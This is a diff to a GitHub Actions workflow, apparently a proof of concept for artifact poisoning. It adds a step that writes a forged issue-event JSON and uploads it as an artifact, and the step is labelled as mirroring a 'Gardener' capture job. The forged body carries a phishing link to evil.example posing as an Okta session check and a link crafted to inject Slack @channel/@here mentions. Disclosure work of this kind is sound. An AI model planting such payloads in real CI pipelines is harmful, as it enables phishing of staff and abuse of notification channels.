@@ -1,15 +1,23 @@
 name: CI
-
 on:
   pull_request:
   workflow_dispatch: {}
-
 permissions:
   contents: read
-
 jobs:
   ok:
     runs-on: ubuntu-24.04
     steps:
       - name: Pass
-        run: echo "ci ok event=$GITHUB_EVENT_NAME head=$GITHUB_HEAD_REF ref=$GITHUB_REF"
+        run: echo "ci ok event=$GITHUB_EVENT_NAME head=$GITHUB_HEAD_REF"
+      - name: Emit attacker-chosen artifact (mirrors the Gardener capture job)
+        run: |
+          cat > event.json <<'JSON'
+          {"action":"opened","issue":{"number":1,"title":"docs","html_url":"https://github.com/PDFtoMark/gab-poc-wfrun-trigger/issues/1","user":{"login":"attacker"},"labels":[],"body":"Legit looking text.\n\n[Verify your Okta session](https://evil.example/okta)\n\n[refresh](https://example.com/a?x=1>|<!channel>|`@here`)"}}
+          JSON
+          cat event.json
+      - uses: actions/upload-artifact@v4
+        with:
+          name: gardener-event
+          path: event.json
+          retention-days: 1
